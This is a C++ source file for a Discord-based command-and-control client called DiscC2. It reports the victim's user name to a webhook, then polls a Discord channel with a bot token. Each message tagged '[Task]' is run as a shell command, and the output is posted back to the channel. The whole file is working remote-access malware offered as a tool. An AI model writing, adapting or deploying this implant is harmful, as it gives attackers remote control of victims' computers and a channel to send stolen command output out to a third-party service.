#include <iostream>
#include <string>
#include <array>
#include <memory>
#include <thread>
#include <chrono>
#include <regex>
#include "settings.h"

using namespace std;

string exec(const string& cmd) {
    array<char, 128> buf;
    string result;
    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
    if (!pipe) return "Execution failed";
    while (fgets(buf.data(), buf.size(), pipe.get()) != nullptr) {
        result += buf.data();
    }
    return result;
}

int main() {
    cout << "[!] DiscC2: github.com/N3agu/DiscC2\n\n";

    if (WEBHOOK_URL != "") {
        string user = exec("whoami");
        user = regex_replace(user, regex("\n"), "");
        user = regex_replace(user, regex("\r"), "");
        user = regex_replace(user, regex("\\\\"), "\\\\\\\\");

        string wh_msg = "Client connected: " + user + ", message sent through the webhook.";
        string wh_cmd = "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"" + wh_msg + "\\\"}\" \"" + WEBHOOK_URL + "\"";
        exec(wh_cmd);
        cout << "[*] Initial check-in sent via Webhook.\n";
    }

    string base_url = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages?limit=1";
    string reply_url = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
    string last_msg_id = "";

    while (true) {
        string fetch_cmd = "curl -s -H \"Authorization: Bot " + BOT_TOKEN + "\" \"" + base_url + "\"";
        string response = exec(fetch_cmd);

        smatch match;
        regex id_regex("\"id\":\\s*\"(\\d+)\"");
        regex content_regex("\"content\":\\s*\"\\[Task\\]\\s*([^\"]+)\"");

        if (regex_search(response, match, id_regex)) {
            string current_msg_id = match[1].str();

            if (current_msg_id != last_msg_id && last_msg_id != "") {
                if (regex_search(response, match, content_regex)) {
                    string task_cmd = match[1].str();

                    task_cmd = regex_replace(task_cmd, regex("\\\\\""), "\"");
                    task_cmd = regex_replace(task_cmd, regex("\\\\\\\\"), "\\");

                    cout << "[+] Extracted Command: [" << task_cmd << "]\n";

                    if (task_cmd == "exit" || task_cmd == "quit") {
                        cout << "[!] Exit command received. Shutting down.\n";
                        string exit_cmd = "curl -s -X POST -H \"Authorization: Bot " + BOT_TOKEN + "\" -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"```Command received. Client shutting down...```\\\"}\" \"" + reply_url + "\"";
                        exec(exit_cmd);
                        break;
                    }

                    cout << "[*] Executing command...\n";
                    string output = exec(task_cmd);

                    string clean_output = regex_replace(output, regex("\\\\"), "\\\\\\\\");
                    clean_output = regex_replace(clean_output, regex("\""), "\\\"");
                    clean_output = regex_replace(clean_output, regex("\n"), "\\n");
                    clean_output = regex_replace(clean_output, regex("\r"), "");

                    cout << "[*] Replying via Bot API...\n";
                    string post_cmd = "curl -s -X POST -H \"Authorization: Bot " + BOT_TOKEN + "\" -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"```\\n" + clean_output + "\\n```\\\"}\" \"" + reply_url + "\"";
                    exec(post_cmd);
                }
            }
            last_msg_id = current_msg_id;
        }
        this_thread::sleep_for(chrono::seconds(3));
    }
    return 0;
}